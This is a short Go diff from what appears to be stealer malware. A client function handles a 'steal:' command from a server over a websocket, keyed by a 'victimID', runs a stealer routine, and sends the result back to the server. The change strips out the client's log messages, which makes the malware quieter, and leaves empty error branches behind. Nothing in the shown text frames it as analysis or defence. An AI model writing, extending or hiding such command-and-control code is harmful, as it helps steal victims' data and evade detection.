@@ -260,9 +260,7 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 
 	if strings.HasPrefix(lower, "steal:") {
 		go func() {
-			log.Println("[client] steal command received, running stealer...")
 			result := runStealer()
-			log.Printf("[client] stealer finished, result length: %d", len(result))
 
 			if conn != nil {
 				msg := map[string]interface{}{
@@ -271,12 +269,8 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 					"auto_steal": "",
 				}
 				if err := wsWriteJSON(conn, msg); err != nil {
-					log.Printf("[client] failed to send steal_result: %v", err)
-				} else {
-					log.Println("[client] steal_result sent successfully")
 				}
 			} else {
-				log.Println("[client] conn is nil, cannot send steal_result")
 			}
 		}()
 		return
